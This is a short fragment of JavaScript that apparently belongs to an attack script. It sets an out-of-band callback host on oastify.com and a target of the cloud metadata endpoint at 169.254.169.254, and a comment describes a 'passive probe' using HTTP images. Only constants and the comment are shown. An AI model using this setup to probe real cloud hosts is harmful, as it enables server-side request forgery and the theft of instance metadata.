            const oast = "https://ie0z38xjt8769e7sxsendgn17sdj19py.oastify.com";
            const target = "http://169.254.169.254/latest/meta-data/hostname";

            // 2. PASSIVE PROBE: Browsers allow HTTP images on HTTPS pages more freely.
